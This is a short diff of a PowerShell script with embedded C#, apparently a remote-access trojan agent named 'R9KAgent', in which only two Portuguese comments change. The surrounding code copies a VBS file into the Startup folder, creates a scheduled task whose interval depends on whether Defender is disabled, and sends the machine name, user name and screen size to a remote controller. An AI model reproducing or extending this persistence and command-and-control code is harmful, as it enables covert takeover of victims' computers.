@@ -90,7 +90,7 @@ while (`$true) {
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 4. Persistência via schtasks.exe + XML — sem WMI do Agendador
+    # 4. Persistência via schtasks.exe + XML
     try {
         $interval = if ($defenderOff) { 3 } else { 1 }
         $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
@@ -268,7 +268,7 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.AutoFlush = true;
                     globalWriter = myWriter;
                     
-                    // AQUI ESTÁ A CORREÇÃO DO NOME DO PC
+                    // AQUI ENVIA O NOME DO PC
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
                     
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
